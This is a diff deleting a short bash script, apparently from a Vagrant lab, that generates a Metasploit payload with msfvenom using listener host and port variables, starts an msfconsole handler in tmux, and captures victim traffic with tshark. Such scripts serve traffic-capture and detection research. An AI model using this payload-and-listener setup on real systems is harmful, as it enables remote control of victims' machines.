@@ -1,7 +1,0 @@
-#!/bin/bash
-
-msfvenom --payload $payload --platform $platform --arch $arch LHOST=$ts_host LPORT=$ts_port -f $beacon_format > /vagrant/data/$beacon_file
-
-tmux new-session -d -s collector -n listener 'msfconsole -r /vagrant/data/handler.rc'
-tmux new-window -t collector -n tshark 'tshark -i $server_nic -f "tcp and host $victim_host" -c $packet_cnt -w /vagrant/data/$pcap_file_name'
-tmux ls
